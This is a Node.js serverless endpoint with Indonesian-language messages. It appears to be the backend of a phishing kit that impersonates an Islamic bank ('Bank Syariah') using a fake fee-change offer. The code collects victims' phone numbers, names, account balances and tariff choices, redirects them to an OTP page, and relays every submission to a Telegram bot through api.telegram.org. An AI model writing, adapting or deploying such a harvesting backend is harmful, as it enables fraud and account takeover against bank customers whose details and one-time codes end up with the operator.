const axios = require('axios');

module.exports = async (req, res) => {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      message: 'Method not allowed' 
    });
  }

  try {
    console.log('Request received:', req.method, req.url);
    
    // Parse JSON body
    let body;
    try {
      body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    } catch (parseError) {
      console.error('JSON parse error:', parseError);
      return res.status(400).json({
        success: false,
        message: 'Invalid JSON format'
      });
    }

    const { tarif, nohp, nama, saldo } = body;
    
    console.log('Received data:', { tarif, nohp, nama, saldo });

    // Validation
    if (!tarif || !nohp || !nama || !saldo) {
      return res.status(400).json({
        success: false,
        message: 'Semua field harus diisi: tarif, nohp, nama, saldo'
      });
    }

    // Clean and validate phone number
    const cleanNoHp = nohp.replace(/\D/g, '');
    if (cleanNoHp.length < 10 || cleanNoHp.length > 13) {
      return res.status(400).json({
        success: false,
        message: 'Nomor HP harus 10-13 digit'
      });
    }

    // Prepare response data
    const responseData = {
      success: true,
      message: 'Data berhasil diproses',
      data: {
        id: Date.now(),
        tarif,
        nohp: cleanNoHp,
        nama: nama.trim(),
        saldo: saldo.replace(/\D/g, ''),
        timestamp: new Date().toISOString()
      },
      redirect: '/otp.html'
    };

    console.log('Sending response:', responseData);

    // Send success response
    res.status(200).json(responseData);

    // Optional: Send to Telegram (async, doesn't block response)
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
      try {
        await sendToTelegram(responseData.data);
        console.log('Telegram notification sent');
      } catch (telegramError) {
        console.error('Telegram error:', telegramError.message);
      }
    }

  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({
      success: false,
      message: 'Terjadi kesalahan server. Silakan coba lagi.',
      error: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
};

// Telegram function
async function sendToTelegram(data) {
  const tarifText = data.tarif === 'baru' 
    ? 'TARIF BARU Rp 150.000 / BULAN' 
    : 'TARIF LAMA Rp 6.500 / TRANSAKSI';
  
  const message = `
📱 *DATA BANK SYARIAH* 📱

• 📞 No. HP: ${data.nohp}
• 👤 Nama: ${data.nama}
• 💰 Saldo: Rp ${data.saldo}
• 📊 Tarif: ${tarifText}
• ⏰ Waktu: ${new Date(data.timestamp).toLocaleString('id-ID')}
• 🆔 ID: ${data.id}
  `.trim();

  const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  
  const response = await axios.post(url, {
    chat_id: process.env.TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'Markdown'
  });

  return response.data;
}
